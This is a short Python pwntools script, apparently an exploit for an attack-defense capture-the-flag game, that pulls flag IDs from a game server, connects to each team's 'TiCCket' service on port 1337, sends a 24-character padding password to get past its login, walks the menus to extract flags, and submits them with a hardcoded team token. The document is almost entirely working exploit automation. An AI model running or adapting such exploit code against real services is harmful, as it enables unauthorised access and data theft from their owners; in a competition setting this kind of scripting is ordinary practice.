import requests
from pwn import *
import json

TEAM_TOKEN = '3e98bc8a3b12fdcad0052bbdb8a31cd7'

def main():
    flags = list()
    json_page = requests.get('http://10.10.0.1:8081/flagIds').json()
    for key in json_page['TiCCket']:
        for ctf in json_page['TiCCket'][key]:
            dic = json.loads(ctf)

            r = remote(key, 1337)
            r.recvuntil(b'> ')
            r.sendline(b'1')
            r.recvuntil(b': ')
            r.sendline(dic['ctf_id'].encode())
            r.recvuntil(b': ')
            r.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAA')
            if (r.recvline().decode() != '\n'):
                r.close()
            if(r.recvline().decode() == 'Welcome back, player.'):
                r.close()
            else:
                r.recvuntil(b'> ')
                r.sendline(b'3')
                r.recvuntil(b': ')
                r.sendline(b'0')
                r.recvuntil(b'> ')
                r.sendline(b'2')
                flags.append(r.recvuntil(b'=').split()[-1])
                r.close()
        

        print(requests.put('http://10.10.0.1:8080/flags', headers={
        'X-Team-Token': TEAM_TOKEN
        }, json=flags).text)


if __name__ == '__main__':
    main()